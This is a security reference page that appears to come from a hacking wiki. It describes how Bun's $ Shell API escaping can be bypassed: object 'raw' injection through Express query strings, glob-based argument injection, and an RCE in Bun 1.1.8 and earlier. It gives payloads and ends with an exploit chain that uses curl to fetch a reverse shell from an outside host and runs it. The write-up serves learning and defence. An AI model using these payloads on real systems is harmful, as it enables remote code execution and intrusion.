---
description: An alternative JavaScript runtime with unique libraries and quirks
---

# Bun

## # Related Pages

{% content-ref url="../javascript/" %}
[javascript](../javascript/)
{% endcontent-ref %}

{% content-ref url="nodejs.md" %}
[nodejs.md](nodejs.md)
{% endcontent-ref %}

## Description

[Bun](https://bun.sh/) is an alternative runtime to NodeJS. It aims to be faster, and pack all tooling into one command: `bun`. This re-implementation comes with some quirks, and the added features can have vulnerabilities too. This page will describe some of them.

## Bun $ Shell

Bun is an alternative JavaScript runtime just like NodeJS, but has some more native packages. One such API is the [$ Shell API](https://bun.sh/docs/runtime/shell) that allows running shell commands safely with [Tagged templates](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template\_literals#tagged\_templates). User input as a string will be **escaped** properly to prevent injection of more commands.&#x20;

### Command Injection using Objects

Take a look at the following example:

<pre class="language-typescript" data-title="Example"><code class="lang-typescript">import express from "express";
import { $ } from "bun";

app.get("/", async (req, res) => {
<strong>  const dir = req.query.dir || "";
</strong>
  res.set("Content-Type", "text/plain");
  try {
<strong>    const output = await $`ls /${dir}`.text();
</strong>
    res.send(output);
  } catch (err) {
    console.error(err);
    res.status(500).send(`${err.message}\n${err.stderr}`);
  }
});
</code></pre>

Running this, we can try to access `/?dir=$(id)` in hopes of command substitution, but we get an error instead:

> ```
> ls: /$(id): No such file or directory
> ```

The same will happen for any command injection attempt. There are however, edge cases where this is exploitable, and the example above is surprisingly one of them. The problem lies in an obscure functionality that disables the escaping of arguments: [**`$.escape` (escape strings)**](https://bun.sh/docs/runtime/shell#escape-escape-strings)

In that section of the documentation an interesting example is shown:

> If you do not want your string to be escaped, wrap it in a `{ raw: 'str' }` object:

```javascript
import { $ } from "bun";

await $`echo ${{ raw: '$(foo) `bar` "baz"' }}`;
// => bun: command not found: foo
// => bun: command not found: bar
// => baz
```

If the value in the tagged template is an **object with a `raw` key**, the value **is not escaped**. If we are able to abuse any functionality to make our input into an object, we can include this `raw:` key ourselves to bypass the filtering. In Express, this is possible by using a more complex query string that can create objects like `?dir[raw]=$(id)` becoming `{ raw: "$(id)" }`. This works!

> ```
> Failed with exit code 1
> ls: groups=1000(user): No such file or directory
> ls: /uid=1000(user): No such file or directory
> ls: gid=1000(user): No such file or directory
> ```

Many other frameworks allow creating an object like this from a query string, or even directly from **JSON input** in a request body.&#x20;

### Globbing

One more interesting functionality in Bun is that [globbing](https://tldp.org/LDP/abs/html/globbingref.html) is partially implemented for filename expansion. This allows inputs like `*` to match all files, and more specific patterns like `*.txt` to match only files ending in `.txt`. Take the following example:

```javascript
const string = String(req.query.string || "");
const output = await $`echo ${string}`.text();
```

The above code should directly echo back your input, but natively it allows wildcards to match any local filenames, even in different directories:

{% code title="?string=*" %}
```bash
package.json node_modules tsconfig.json bun.lockb README.md index.ts
```
{% endcode %}

{% code title="?string=../*" %}
```bash
../project1 ../project2 ../project3
```
{% endcode %}

{% code title="?string=/etc/*" %}
```bash
/etc/alternatives /etc/apt /etc/bash.bashrc ...
```
{% endcode %}

Note that depending on the filenames matched, this can even inject multiple arguments into a place where normally only one argument should be. The following Python script can be used to test this:

{% code title="args.py" %}
```python
#!/usr/bin/env python3
import sys
print(sys.argv[1:])
```
{% endcode %}

```javascript
const string = String(req.query.string || "");
const output = await $`./args.py ${string}`.text();
```

The above will generate multiple arguments in the place of `${string}`, and if you have control over the filenames matched, it may allow you to perform some more complex [#argument-injection-wildcards](../../linux/linux-privilege-escalation/command-exploitation.md#argument-injection-wildcards "mention") attacks:

{% code title="?string=a%20b%20c" %}
```python
# Notice a single argument normally:
['1 2 3']
```
{% endcode %}

{% code title="?string=*" %}
```python
# Notice multiple arguments using wildcard:
['package.json', 'args.py', 'node_modules', 'tsconfig.json', 'bun.lockb', 'README.md', 'index.ts']
```
{% endcode %}

### Bun <= v1.1.8 - Forgotten characters

In older versions of Bun, the first implementation of escaping shell characters lacked a few key characters that should have been escaped. Namely: `` ` `` and `<` which can still cause trouble in the command line. [A commit from version 1.1.8 to 1.1.9](https://github.com/oven-sh/bun/commit/60482b6e42445dc277cb6e2ba0e61471cc4fbff1#diff-8944ca8e3b75efc062f0f4b956bc5fa2aa66b2367c80560beedf1dbb7e1b29b3L3964) adds these characters to the escape list.

{% code title="Diff 1.1.8 vs 1.1.9" overflow="wrap" %}
```diff
- const SPECIAL_CHARS = [_]u8{ '$', '>', '&', '|', '=', ';', '\n', '{', '}', ',', '(', ')', '\\', '\"', ' ', '\'' };
+ const SPECIAL_CHARS = [_]u8{ '~', '[', ']', '#', ';', '\n', '*', '{', ',', '}', '`', '$', '=', '(', ')', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '|', '>', '<', '&', '\'', '"', ' ', '\\' };
```
{% endcode %}

Before this commit, we could abuse weird parsing of the shell to write files, and execute commands. Take the following vulnerable example:

<pre class="language-javascript" data-title="Vulnerable Example"><code class="lang-javascript">import { $ } from "bun";

const server = Bun.serve({
    host: "0.0.0.0",
    port: 1337,
    async fetch(req) {
<strong>        const msg = (await req.formData()).get("msg");
</strong>        if (typeof msg !== "string") {
            return new Response("msg is not a string", { status: 400 });
        }

<strong>        const output = await $`echo ${msg}`.text();
</strong>        return new Response(output, { headers: { "Content-Type": "text/plain" } });
    }
});
</code></pre>

In the above code snippet, any input inside `msg=` will be passed to `echo` and returned as a response. The shell API is used correctly and should not allow for command injection. It is however vulnerable to RCE in this older version!

First, you should know a weird parsing behaviour allowing you to **write the output of a command to a file**. By piping STDOUT (`1`) from an input file with `<`, the output of the `echo` command is **appended** to the file. Note that spaces are not allowed, but the payload below works:

{% code title="Payload" %}
```sh
anything1</tmp/foo
```
{% endcode %}

{% code title="Result" %}
```sh
$ cat /tmp/foo
anything
```
{% endcode %}

{% code title="Payload 2" %}
```sh
some%09tabs1</tmp/foo
```
{% endcode %}

{% code title="Result" %}
```sh
$ cat /tmp/foo
anything
some    tabs
```
{% endcode %}

Tabs (`%09`) are allowed, and can be used as shell argument separators.

Next, backticks (`` ` ``) are not escaped either. These allow for execution of arbitrary commands, just without arguments. By passing the just-written file as input to `sh`, we will be able to execute arbitrary commands _with_ arguments.

{% code title="Payload" %}
```sh
`sh</tmp/foo`
```
{% endcode %}

In the first step, we could have written a file with some commands to execute a reverse shell. Keep in mind that there are still some limitations around what content may be written to the file, as it is directly the output of the original command. You will be able to use only the following special characters in your input before the `<`:

{% code title="Allowed Characters" %}
```regex
\t (%09)
#%!+.-/:?[]^_~
0-9a-zA-Z
```
{% endcode %}

Execute `curl` or `wget` to download an arbitrary file with your reverse shell, or when preinstalled tools are limited, try using [#restricted-charset--no-http-dns-dd-shell](../../linux/hacking-linux-boxes.md#restricted-charset--no-http-dns-dd-shell "mention").

{% code title="Full Exploit" %}
```sh
msg=curl%09host.docker.internal:8000%09-o%09/tmp/shell1</tmp/cmd
msg=`sh</tmp/cmd`
msg=`sh</tmp/shell`
```
{% endcode %}
